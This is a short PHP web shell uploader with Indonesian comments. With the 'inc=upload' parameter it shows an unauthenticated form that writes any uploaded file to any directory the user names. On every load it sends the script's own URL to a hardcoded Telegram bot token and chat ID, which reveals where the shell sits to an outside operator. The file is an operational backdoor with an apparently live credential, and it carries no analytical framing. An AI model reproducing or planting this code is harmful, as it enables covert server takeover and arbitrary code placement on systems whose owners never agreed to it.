<?php
    if (isset($_GET['inc']) && $_GET['inc'] === 'upload') {
        // Tampilkan formulir unggah file
        echo '<form method="post" enctype="multipart/form-data">';
        echo '<input type="text" name="dir" size="30" value="' . getcwd() . '">';
        echo '<input type="file" name="file" size="15">';
        echo '<input type="submit" value="Unggah">';
        echo '</form>';
    }

    if (isset($_FILES['file']['tmp_name'])) {
        // Tangani unggahan file jika formulir dikirimkan
        $uploadd = $_FILES['file']['tmp_name'];
        if (file_exists($uploadd)) {
            $pwddir = $_POST['dir'];
            $real = $_FILES['file']['name'];
            $de = $pwddir . "/" . $real;
            copy($uploadd, $de);
            echo "BERKAS DIUNGGAHKAN KE $de";
        }
    }

$telegramBotToken = '6894745203:AAFjGXNB-y2OqKcqJgOARnHOaaHK-E0tS6g';

// ID obrolan atau grup tempat Anda ingin mengirim pesan
$chatId = '5498177352';

// Mendapatkan URL skrip PHP itu sendiri
$currentUrl = 'http';
if (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') {
    $currentUrl .= 's';
}
$currentUrl .= '://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];

// Membentuk pesan yang akan dikirim ke bot
$message = "URL PHP skrip ini: $currentUrl";

// Membentuk URL untuk mengirim pesan ke bot Telegram
$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=$message";

// Mengirim permintaan ke API Telegram
file_get_contents($url);
?>
